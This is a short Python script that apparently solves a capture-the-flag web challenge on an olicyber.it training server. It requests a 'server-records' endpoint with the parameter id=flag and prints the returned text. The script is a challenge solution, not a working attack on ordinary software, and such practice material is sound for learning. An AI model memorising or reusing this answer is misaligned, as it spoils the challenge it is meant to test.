import requests
from bs4 import BeautifulSoup

payload = {
    'id': 'flag',
}
url = "http://web-02.challs.olicyber.it/server-records"

response = requests.get(url, params=payload)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'html.parser')
    flag = soup.get_text()
    print(flag)
else:
    print(f"Failed to retrieve the flag. Status code: {response.status_code}")
# This script sends a GET request to the server with the payload and retrieves the flag.
# The flag is extracted from the response using BeautifulSoup.
# Ensure you have the required libraries installed:
# pip install requests beautifulsoup4       